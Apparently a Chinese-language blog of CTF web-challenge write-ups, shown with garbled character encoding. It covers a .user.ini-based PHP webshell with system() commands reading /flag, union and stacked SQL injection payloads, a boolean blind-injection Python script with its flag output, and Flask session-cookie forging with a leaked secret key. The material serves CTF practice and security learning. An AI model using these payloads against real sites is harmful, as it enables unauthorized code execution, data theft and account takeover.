<p>å…ˆä¸Šä¼ pass.gifå†ä¸Šä¼ .user.ini<br>è®¿é—®<code>/uploads/5e6f2693d111128ec4f1d7336f65b87f/index.php</code><br>.user.iniä¸­auto_prepend_file=pass.gifä¼šåœ¨æ‰§è¡Œindex.phpå‰æŠŠpassåŒ…å«è¿›æ¥ï¼Œä¸”è§£æä¸ºphpæ ¼å¼<br>ps:user.inié‡Œæœ‰ä¸ªuser_ini.cache_ttl ï¼Œå®ƒæ§åˆ¶ç€é‡æ–°è¯»å–ç”¨æˆ· iniæ–‡ä»¶çš„æ—¶é—´ï¼Œå¯èƒ½æ—¶é—´ä¸€åˆ°åˆ·æ–°æ‰äº†ï¼Œè¿™æ—¶è¦é‡æ–°ä¸Šä¼ .user.iniã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">?pass=system("ls /");  æˆ–?pass=var_dump(scandir("/")); // æ‰«æå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºæ¥ 
?pass=system("cat /flag");  æˆ–?pass=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<hr>
<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>ä¸€å¼€å§‹è¯•äº†è¯•usernameæ˜¯adminæ²¡æƒ³åˆ°è’™å¯¹äº†ï¼ˆ<br>åœ¨burpä¸­æ‰¾åˆ°äº†è¿™ä¸ªï¼ˆè¿™æ˜¯å•¥<br><code>&lt;--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code><br>å…ˆbase32å†base64å¾—åˆ°<code>select * from user where username = '$name'</code><br><del>å¥½å§è°¢è°¢ä½†æˆ‘å·²ç»è’™å‡ºusernameäº†</del><br>ç”¨å­—å…¸intrudeäº†ä¸€ä¸‹å‘ç°or,=ï¼Œï¼ˆï¼Œï¼‰éƒ½è¢«è¿‡æ»¤äº†ã€‚ä½¿ç”¨å¤§å°å†™ç»•è¿‡or,ä½¿ç”¨likeç»•è¿‡=<br><a href="https://">https://blog.csdn.net/weixin_40950781/article/details/100061268</a><br>SELECT 1,2,3&nbsp; æ˜¯ä¸€ä¸ªç®€å•çš„æŸ¥è¯¢è¯­å¥ï¼Œå®ƒä¼šè¿”å›ä¸€è¡ŒåŒ…å«ä¸‰ä¸ªåˆ—çš„æ•°æ®ï¼Œè¿™ä¸‰ä¸ªåˆ—çš„å€¼åˆ†åˆ«ä¸º &nbsp;1&nbsp;ã€&nbsp;2&nbsp; å’Œ &nbsp;3&nbsp;ã€‚&nbsp;SELECT&nbsp; å…³é”®å­—ç”¨äºæŒ‡å®šè¦ä»æ•°æ®åº“ä¸­æ£€ç´¢çš„æ•°æ®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ²¡æœ‰ä»ä»»ä½•è¡¨ä¸­è·å–æ•°æ®ï¼Œè€Œæ˜¯ç›´æ¥æŒ‡å®šäº†è¦è¿”å›çš„å…·ä½“å€¼ã€‚<br><code>1' union select 1,2,3# </code>æœ‰ä¸‰ä¸ªå­—æ®µ<br>æpasswordç”¨<code>select * fRom user where username like 'admin'</code>è¿˜æ˜¯é”™çš„ï¼ˆå“­<br><del>å·çœ‹æºç </del>å‘ç°ç”¨äº†md5ï¼ˆæˆ‘ï¼šå•Šï¼Ÿï¼Ÿï¼Ÿï¼Ÿ<br><a href="https://">https://github.com/imagin-sch/GXY_CTF/blob/master/Web/BabySqli/dockerfile/files/html/search.php</a><br><a href="https://">https://www.runoob.com/php/func-mysqli-fetch-row.html</a><br><a href="https://">https://www.runoob.com/php/func-mysqli-query.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">$name = $_POST['name'];
$password = $_POST['pw'];
$t_pw = md5($password);
$sql = "select * from user where username = '".$name."'";
// echo $sql;
$result = mysqli_query($con, $sql);#mysqli_query() å‡½æ•°æ‰§è¡ŒæŸä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚
$arr = mysqli_fetch_row($result);#ä»**æ•°æ®åº“**ç»“æœé›†ä¸­è·å–ä¸€è¡Œæ•°æ®çš„å‡½æ•°ã€‚å®ƒè¿”å›ä¸€ä¸ªæšä¸¾æ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸ªç»“æœ**åˆ—**å­˜å‚¨åœ¨ä»0å¼€å§‹çš„æ•°ç»„åç§»é‡ä¸­ã€‚
if($arr[1] == "admin"){
if(md5($password) == $arr[2]){
echo $flag;
			}				
			<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>arr[0]ï¼Œ[1]ï¼Œ[2]åˆ†åˆ«å¯¹åº”union select 1,2,3#<br>arr[1]æ˜¯admin,[2]æ˜¯password=&gt;union select 1,â€™adminâ€™,password#<br>ç°åœ¨è¦æ±‚arr[2]å³union selectçš„3ï¼ˆpassword)md5åä¸passwordç›¸ç­‰å³å¯<br>username:<code>7' union select 1,'admin','8f14e45fceea167a5a36dedd4bea2543'# (è¿™é‡Œç¬¬ä¸€ä¸ªä¸èƒ½æ˜¯adminï¼Œä¸ç„¶ä¼šç›´æ¥è·³è½¬åˆ°wrong pass</code><br>password:<code>7(7æ˜¯æˆ‘çš„å¹¸è¿æ•°å­—^_^</code></p>
<hr>
<h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>æ‰”è¿›burp è¿‡ä¸€ä¸‹å­—å…¸ï¼ˆ<br><del>ç»“æœç›´æ¥çˆ†å‡ºæ¥äº†ï¼ˆå•Šï¼Ÿ</del><br><code>1' or 1=1#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd79cb6b0b.png" alt="e35b88b5086142e59614ceecd58e31fe.png"><br><code>return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);</code><br><code>1';show database();#</code><br><code>1';show tables;#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd79c3caa1.png" alt="abe40dfce048a68691247cc280c3e2f5.png"><br><code>1'; show columns from FlagHere;#</code><br><img src="https://pick.lwzheng.tech/2025/01/19/678cd8de49914.png" alt="1753b9108c6497effa9223a7ed50a885.png"><br><code>1';handler FlagHere open as </code>ddl<code>;handler </code>ddl<code> read next;#</code><br>å¾—åˆ°flag?????<br><img src="https://pick.lwzheng.tech/2025/01/19/678cdc5539e8c.png" alt="ccbd38ab641e15b7ff867aec3b9fb0d9.png"><br><del>é‚£æˆ‘è¯·é—®è¿™é“é¢˜è·Ÿ[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨æœ‰å•¥åŒºåˆ«å‘¢ï¼ˆ</del><br><del>å¤šç»™ä¸ª114514è¯•å›¾è¿·æƒ‘ï¼ˆå³ç­”</del></p>
<hr>
<h3 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p><code>1</code> =&gt;<code>Hello, glzjin wants a girlfriend.</code><br>å¼€å¹•é›·å‡»ï¼ˆ<del>å®åœ¨ä¸è¡Œå’±æ”¾å¼ƒå§å“¥</del><br><code>2</code> =&gt;<code>Do you want to be my girlfriend?</code><br>å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ<br>é™¤1ï¼Œ2ä¹‹å¤–çš„éƒ½æŒ‚äº†ï¼ˆ<br>é¡µé¢åªæœ‰ç™»å½•æˆåŠŸå’Œç™»å½•å¤±è´¥è¿™ä¸¤ç§æƒ…å†µæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚<br>è¾“å…¥1+ç©ºæ ¼è¿”SQL Injection Checked.<del>ï¼ˆåˆæ¬ºè´Ÿç©ºæ ¼</del><br>if(ascii(substr((select flag from flag),1,1))&gt;1,1,2)<br>if(ascii(substr((select(flag)from(flag)),1,1))&gt;1,1,2)<br>æˆ–(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p>
<blockquote>
<p>&nbsp;if()&nbsp; å‡½æ•°ä¸€èˆ¬æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ¡ä»¶åˆ¤æ–­ï¼Œåé¢ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯æ¡ä»¶ä¸ºçœŸå’Œä¸ºå‡æ—¶è¿”å›çš„å€¼ã€‚</p>
</blockquote>
<p>ä¸‹é¢é‚£ä¸ªåˆ™æ˜¯å•çº¯1,0åˆ¤æ–­ã€‚<br><a href="https://">https://blog.csdn.net/python1639er/article/details/112325519</a><br><a href="https://">https://www.begtut.com/python/ref-requests-post.html</a></p>
<pre class="line-numbers language-none"><code class="language-none">&gt; # ç”¨å¸ƒå°”ç›²æ³¨å¾—å‡ºflag:äºŒåˆ†æ³•ï¼Œåšasciiå¾ªåiï¼Œå½“è¿”å›ä¸º1æ—¶å–æ­¤æ—¶çš„ascii(i)å†è½¬æ¢ä¸ºå­—ç¬¦(ascii(substr((select(flag)from(flag)),j,1))&gt;i)(0&lt;=i&lt;=127,0&lt;=j&lt;50)
&gt; import requests
&gt; 
&gt; # requests&nbsp; æ¨¡å—ç”¨äºå‘é€ HTTP è¯·æ±‚ï¼Œè¿™é‡Œä¸»è¦ç”¨äºå‘ç›®æ ‡ç½‘ç«™å‘é€ POST è¯·æ±‚ã€‚
&gt; url = "http://7cd8bda1-df2d-4a3d-af9f-66850cce8b1c.node5.buuoj.cn:81/index.php"
&gt; result = ""
&gt; for i in range(1, 50):#~~ç¬¬ä¸€æ¬¡è®¾çš„30ç„¶åè¿˜æ²¡è¾“å‡ºå®Œå°±ç»“æŸäº†~~
&gt;     for j in range(1, 128):
&gt;         payload = "(ascii(substr((select(flag)from(flag)),{m},1))&gt;{n})"  # &nbsp;{m}&nbsp; å’Œ &nbsp;{n}&nbsp; æ˜¯å ä½ç¬¦ï¼Œä¼šè¢« &nbsp;i&nbsp; å’Œ &nbsp;j&nbsp; çš„å€¼æ›¿æ¢ã€‚
&gt;         response = requests.post(url=url, data={'id': payload.format(m=i,n=j)})  # ä½¿ç”¨ &nbsp;requests.post&nbsp; æ–¹æ³•å‘ç›®æ ‡ URL å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚çš„å‚æ•°æ˜¯ &nbsp;id&nbsp;ï¼Œå…¶å€¼ä¸ºæ„é€ çš„ SQL æ³¨å…¥ payloadã€‚
&gt;         # requests.post(url, data={key: value}, json={key: value}, args)
&gt;         if response.text.find('girlfriend') == -1:  # æ£€æŸ¥å“åº”æ–‡æœ¬ä¸­æ˜¯å¦åŒ…å«å­—ç¬¦ä¸² &nbsp;girlfrined(ç–¯ç‹‚è¿«å®³
&gt;             result = result + chr(j)#å°†å¯¹åº”çš„å­—ç¬¦ &nbsp;chr(j)&nbsp; æ·»åŠ åˆ° &nbsp;result&nbsp; ä¸­ï¼Œåœ¨ Python ä¸­ï¼Œ&nbsp;+&nbsp; è¿ç®—ç¬¦ç”¨äºå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²ã€‚
&gt;             break#è·³å†…å±‚å¾ªç¯
&gt;     print(result)#çœ‹è¿›åº¦
&gt; print(result)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿è¡Œå¾—å¥½æ…¢~</p>
<pre class="line-numbers language-none"><code class="language-none">f
fl
fla
flag
flag{
flag{2
flag{27
flag{274
flag{2744
flag{2744d
flag{2744d1
flag{2744d15
flag{2744d15f
flag{2744d15f-
flag{2744d15f-2
flag{2744d15f-2a
flag{2744d15f-2a4
flag{2744d15f-2a4a
flag{2744d15f-2a4a-
flag{2744d15f-2a4a-4
flag{2744d15f-2a4a-45
flag{2744d15f-2a4a-459
flag{2744d15f-2a4a-4599
flag{2744d15f-2a4a-4599-
flag{2744d15f-2a4a-4599-b
flag{2744d15f-2a4a-4599-b9
flag{2744d15f-2a4a-4599-b90
flag{2744d15f-2a4a-4599-b90e
flag{2744d15f-2a4a-4599-b90e-
flag{2744d15f-2a4a-4599-b90e-f
flag{2744d15f-2a4a-4599-b90e-fc
flag{2744d15f-2a4a-4599-b90e-fce
flag{2744d15f-2a4a-4599-b90e-fced
flag{2744d15f-2a4a-4599-b90e-fced2
flag{2744d15f-2a4a-4599-b90e-fced24
flag{2744d15f-2a4a-4599-b90e-fced242
flag{2744d15f-2a4a-4599-b90e-fced2422
flag{2744d15f-2a4a-4599-b90e-fced2422b
flag{2744d15f-2a4a-4599-b90e-fced2422bc
flag{2744d15f-2a4a-4599-b90e-fced2422bc2
flag{2744d15f-2a4a-4599-b90e-fced2422bc23
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}
flag{2744d15f-2a4a-4599-b90e-fced2422bc23}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>è¿™ç•Œé¢å¥½ç†Ÿæ‚‰ã€‚ã€‚ã€‚ã€‚åƒæäº†â€œæˆ‘çš„ç¬¬ä¸€ä¸ªflaskâ€œä»€ä¹ˆçš„ï¼ˆè¢«æ‰“</p>
<!-- https://github.com/woadsl1234/hctf_flask/ -->

<p>ç„¶åå‘ç°404äº†ï¼ˆ</p>
<p><del>ä½†æ€»ä¹‹æœ€åæ˜¯å·æ¥äº†</del></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜ | ç¦»åˆ«æ­Œ</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">%</span><span class="token punctuation">}</span>
<span class="token operator">&lt;</span>h1 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"nav"</span><span class="token operator">&gt;</span>hctf<span class="token punctuation">{</span>xxxxxxxxx<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>
<span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>

SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'ckj123'</span>
<span class="token comment">#çœ‹æ¥å¤§å®¶éƒ½çˆ±ç”¨åå­—ä½œkeyå‘€ï¼ˆæ„Ÿæ…¨ing</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    image<span class="token punctuation">,</span> code <span class="token operator">=</span> get_verify_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥</span>
    buf <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span>
    buf_str <span class="token operator">=</span> buf<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ</span>
    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>buf_str<span class="token punctuation">)</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/gif'</span>
    <span class="token comment"># å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­</span>
    session<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code
    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flaskçš„sessionæ˜¯å­˜å‚¨åœ¨cookieä¸­ä¸”ä»…ç­¾åè€ŒæœªåŠ å¯†</p>
<pre class="line-numbers language-none"><code class="language-none">#å…ˆæŠŠsessionæ‹¿å‡ºæ¥
.eJxF0MFuwjAMBuBXmXzmAC29IHEApetAiqNGKZVzQQxK06RhWgG1FPHuK0zazr_9_bLvsD02xdnA7NJcixFsqwPM7vD2CTPg1tQiTzvqpdVsU2smK7S11Yl0nMUR-o3Vam04yzpS0lGetqjeLVdlhEncUUA3bdNOqHRCPus1W0XYL26kspYrdxOKpsiWtUikFyztkJUt5tl0MBwpNMN8KNTSoEdDwbvT1kXIDjXlm0qzxWDKSrBVMOzO4TGC_bk5bi9frjj9n_Cs7vdjUnH4JNCWvbZZKHI0GGQ9T9aGPE11Hoc8SNuB9nwxf3GV35XFnySV_CjS3-S080MA39WphBFcz0XzehtMxvD4AYitbJY.Z6NK_Q.c9Wsxg_Bj6vn0mKgkPavhwsLBi8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<pre class="line-numbers language-git" data-language="git"><code class="language-git">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h4><pre class="line-numbers language-none"><code class="language-none">usage: flask_session_cookie_manager{2,3}.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;

optional arguments:
  -h, --help            show this help message and exit
  -s &lt;string&gt;, --secret-key &lt;string&gt;
                        Secret key
  -c &lt;string&gt;, --cookie-value &lt;string&gt;
                        Session cookie value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJxF0MFuwjAMBuBXmXzmAC29IHEApetAiqNGKZVzQQxK06RhWgG1FPHuK0zazr_9_bLvsD02xdnA7NJcixFsqwPM7vD2CTPg1tQiTzvqpdVsU2smK7S11Yl0nMUR-o3Vam04yzpS0lGetqjeLVdlhEncUUA3bdNOqHRCPus1W0XYL26kspYrdxOKpsiWtUikFyztkJUt5tl0MBwpNMN8KNTSoEdDwbvT1kXIDjXlm0qzxWDKSrBVMOzO4TGC_bk5bi9frjj9n_Cs7vdjUnH4JNCWvbZZKHI0GGQ9T9aGPE11Hoc8SNuB9nwxf3GV35XFnySV_CjS3-S080MA39WphBFcz0XzehtMxvD4AYitbJY.Z6NK_Q.c9Wsxg_Bj6vn0mKgkPavhwsLBi8' 

{'_fresh': True, '_id': b'28e9d1c4cd5ed4b69cddd0196ece2a051a4dad051c1894a1cf2f41945be3d29702a5019296840e8df8414805e851da3ad2790a6cacadf9947eaebd05bdb82684', 'csrf_token': b'145c74a17cad683f579ca7e30babf8ea73d0aef0', 'image': b'E4Gy', 'name': 'qing', 'user_id': '10'}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h4><pre class="line-numbers language-none"><code class="language-none">usage: flask_session_cookie_manager{2,3}.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;

optional arguments:
  -h, --help            show this help message and exit
  -s &lt;string&gt;, --secret-key &lt;string&gt;
                        Secret key
  -t &lt;string&gt;, --cookie-structure &lt;string&gt;
                        Session cookie structure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'28e9d1c4cd5ed4b69cddd0196ece2a051a4dad051c1894a1cf2f41945be3d29702a5019296840e8df8414805e851da3ad2790a6cacadf9947eaebd05bdb82684', 'csrf_token': b'145c74a17cad683f579ca7e30babf8ea73d0aef0', 'image': b'E4Gy', 'name': 'admin', 'user_id': '10'}"

.eJxF0MGOgjAQBuBX2czZg4JcTDxoiqwmnYamSKYX4ypSWuomqAExvvuim-ye_5nvz8wDdqemuBiYXZtbMYJddYTZAz6-YAbcmlrkaUe9tJpta81khba2OpGOszhCv7VabQxnWUdKOsrTFtXKclVGmMQdBXTXNu2ESifks16zdYT94k4qa7lyd6FoimxZi0R6wdIOWdlink0Hw5FCM8yHQi0NejQUrJy2LkJ2rCnfVpotBlNWgq2DYXcOzxEcLs1pd_12xfn_hFd1fxiTisMXgbbstc1CkaPBIOt5sjHkaarzOORB2g6054v5m6v8viz-JKnkZ5H-Jue9HwLYH311hhHcLkXz_htMxvD8AfZvbPA.Z6NLTQ.2ijxBi8WejFl8Z7IUnLCtcYZRT4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>flag{ed0fcbdf-7439-497d-ba5b-9970b44bbf86}</code></p>
<hr>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token comment">#nodeprep.prepareå­˜åœ¨æ¼æ´,ä¸”loginçš„æ—¶å€™åˆstrlowerä¸€æ¬¡</span>
    <span class="token keyword">return</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…ˆæ³¨å†Œï¼šá´¬á´°á´¹á´µá´ºï¼Œå†æ”¹å¯†ç ï¼Œå†ç”¨ADMINç™»å½•</p>
<blockquote>
<p>åœ¨æ³¨å†Œçš„æ—¶å€™ â€á´¬á´°á´¹á´µá´ºâ€œ ç»è¿‡strlower()ï¼Œè½¬æˆâ€ADMINâ€œ ï¼Œ åœ¨ä¿®æ”¹å¯†ç çš„æ—¶å€™ â€ADMINâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ , å½“æˆ‘ä»¬å†æ¬¡é€€å‡ºç™»å½•çš„æ—¶å€™ â€adminâ€œç»è¿‡strlower()å˜æˆâ€adminâ€œ</p>
</blockquote>
<hr>
<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><blockquote>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„é”šç‚¹ <code>^</code> å’Œ <code>$</code> åˆ†åˆ«åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ã€‚è€Œå½“ä½¿ç”¨ <code>/m</code> ä¿®é¥°ç¬¦å¼€å¯å¤šè¡Œæ¨¡å¼åï¼Œ<code>^</code> å’Œ <code>$</code> çš„åŒ¹é…è§„åˆ™ä¼šå‘ç”Ÿå˜åŒ–ï¼š</p>
<ul>
<li><code>^</code> å¯ä»¥åŒ¹é…æ¯è¡Œçš„å¼€å¤´ï¼ˆæ¢è¡Œç¬¦ <code>\n</code> ä¹‹åçš„ä½ç½®ï¼‰ã€‚</li>
<li><code>$</code> å¯ä»¥åŒ¹é…æ¯è¡Œçš„ç»“å°¾ï¼ˆæ¢è¡Œç¬¦ <code>\n</code> ä¹‹å‰çš„ä½ç½®ï¼‰ã€‚</li>
</ul>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$<span class="token punctuation">(</span><span class="token string single-quoted-string">'#calc'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token comment"># $('#calc')ï¼šä½¿ç”¨ jQuery é€‰æ‹©å™¨é€‰ä¸­ id ä¸º calc çš„è¡¨å•å…ƒç´ ã€‚</span>
<span class="token comment">#.submit()ï¼šä¸ºé€‰ä¸­çš„è¡¨å•å…ƒç´ ç»‘å®šæäº¤äº‹ä»¶å¤„ç†å‡½æ•°ã€‚å½“è¡¨å•è¢«æäº¤æ—¶ï¼Œä¼šæ‰§è¡Œè¯¥å‡½æ•°å†…çš„ä»£ç ã€‚</span>
        $<span class="token operator">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            url<span class="token punctuation">:</span><span class="token string double-quoted-string">"calc.php?num="</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string double-quoted-string">"#content"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token argument-name">type</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span>
            <span class="token argument-name">success</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">{</span>
                $<span class="token punctuation">(</span><span class="token string double-quoted-string">"#result"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`&lt;div class="alert alert-success"&gt;
            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;${data}
            &lt;/div&gt;`</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token argument-name">error</span><span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿™å•¥?ç®—ä¸æ¥!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
                 <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token comment">#return false;ï¼šé˜»æ­¢è¡¨å•çš„é»˜è®¤æäº¤è¡Œä¸ºï¼Œå³é˜»æ­¢é¡µé¢åˆ·æ–°å¹¶è·³è½¬åˆ°è¡¨å•çš„ action å±æ€§æŒ‡å®šçš„ URLã€‚</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

 ã€Š<span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
